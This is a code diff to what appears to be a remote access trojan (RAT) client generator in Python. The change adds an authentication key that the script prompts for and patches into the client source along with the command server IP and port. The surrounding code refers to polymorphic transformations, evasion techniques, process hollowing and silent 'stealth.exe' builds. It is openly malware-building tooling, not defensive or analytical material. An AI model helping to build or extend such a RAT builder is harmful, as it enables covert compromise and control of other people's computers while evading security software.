@@ -290,9 +290,14 @@ def generate_client(options):
             content = f.read()
         
         print(f"{Fore.YELLOW}[*] Applying server configuration...{Style.RESET_ALL}")
-        # Replace SERVER_IP and SERVER_PORT values correctly
+        # Replace SERVER_IP, PORT, and AUTH_KEY values correctly
         content = re.sub(r'#define SERVER_IP "[^"]+"', f'#define SERVER_IP "{options["ip"]}"', content)
         content = re.sub(r'#define PORT \d+', f'#define PORT {options["port"]}', content)
+        content = re.sub(r'#define AUTH_KEY "[^"]*"', f'#define AUTH_KEY "{options["auth_key"]}"', content)
+        
+        print(f"{Fore.GREEN}[✓] Server IP: {options['ip']}{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}[✓] Server Port: {options['port']}{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}[✓] Authentication Key: {options['auth_key']}{Style.RESET_ALL}")
         
         # Apply polymorphic transformations and evasion techniques
         content = apply_polymorphic_transformations(content, engine, options)
@@ -372,10 +377,10 @@ def parse_arguments():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog='''
 Examples:
-  python rat_client_generator.py                           # Interactive mode
+  python rat_client_generator.py                           # Interactive mode (prompts for auth key)
   python rat_client_generator.py --silent                  # Interactive mode with silent build
   python rat_client_generator.py --ip 192.168.1.100 --port 4444 --output stealth.exe --silent
-  python rat_client_generator.py --ip 192.168.1.100 --port 4444 --batch
+  python rat_client_generator.py --ip 192.168.1.100 --port 4444 --batch  # Still prompts for auth key
         '''
     )
     
@@ -396,6 +401,7 @@ def main():
     options = {
         "ip": args.ip or "",
         "port": str(args.port) if args.port != 8888 else DEFAULT_PORT,
+        "auth_key": "",  # Authentication key - always prompted interactively
         "output": args.output if args.output != 'rat_client.exe' else DEFAULT_OUTPUT,
         "silent": args.silent,
         "process_hollowing": False,
@@ -428,6 +434,17 @@ def main():
                 options["port"] = port
                 break
             print(f"{Fore.RED}[!] Invalid port. Please enter a number between 1 and 65535.{Style.RESET_ALL}")
+        
+        # Always prompt for authentication key interactively for security
+        print(f"\n{Fore.CYAN}─── SECURITY AUTHENTICATION ───{Style.RESET_ALL}")
+        while True:
+            auth_key = input(f"{Fore.RED}[{Fore.WHITE}+{Fore.LIGHTBLUE_EX}]{Fore.WHITE} Authentication Key {Fore.YELLOW}(required for secure connection) ➤ {Style.RESET_ALL}")
+            if auth_key.strip():
+                options["auth_key"] = auth_key.strip()
+                print(f"{Fore.GREEN}[✓] Authentication key set: '{auth_key.strip()}'{Style.RESET_ALL}")
+                break
+            print(f"{Fore.RED}[!] Authentication key cannot be empty. Please enter a valid key.{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}─────────────────────────────{Style.RESET_ALL}\n")
         
         # Get output filename with enhanced prompt
         output_name = input(f"{Fore.RED}[{Fore.WHITE}+{Fore.LIGHTBLUE_EX}]{Fore.WHITE} Output filename {Fore.YELLOW}[{options['output']}] ➤ {Style.RESET_ALL}")
